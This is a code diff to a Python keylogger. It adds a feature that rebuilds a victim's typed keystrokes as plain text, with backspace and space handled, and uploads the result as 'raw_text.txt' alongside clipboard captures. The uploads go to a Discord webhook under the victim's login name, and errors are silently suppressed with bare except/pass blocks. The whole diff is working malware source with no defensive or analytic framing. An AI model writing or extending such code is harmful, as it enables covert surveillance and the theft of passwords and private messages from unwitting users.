@@ -66,6 +66,11 @@ def check_if_should_send(lines):
             file_path.parent.mkdir(parents=True, exist_ok=True)
             with file_path.open('r') as file:
                 webhook.add_file(file=file.read(), filename="clipboard.txt")
+            
+            file_path = Path.home() / input_plaintext_name
+            file_path.parent.mkdir(parents=True, exist_ok=True)
+            with file_path.open('r') as file:
+                webhook.add_file(file=file.read(), filename="raw_text.txt")
         except:
             pass
         embed = DiscordEmbed(title=f"Logs from {os.getlogin()}", color=generate_color(os.getlogin()))
@@ -225,6 +230,30 @@ def on_press(key):
     else:
         with file_path.open('a') as file:
             file.write(log)
+    
+    try:
+        file_path = Path.home() / input_plaintext_name
+        file_path.parent.mkdir(parents=True, exist_ok=True)
+
+        if key_name == "backspace":
+            if file_path.exists():
+                with file_path.open('r') as file:
+                    text = file.readline()[:-1]
+                with file_path.open('w') as file:
+                    file.write(text)
+        else:
+            if key_name == "space":
+                log = " "
+            else:
+                log = key.char
+
+            if not file_path.exists():
+                file_path.write_text(log)
+            else:
+                with file_path.open('a') as file:
+                    file.write(log)
+    except:
+        pass
 
 def on_release(key):
     global clip
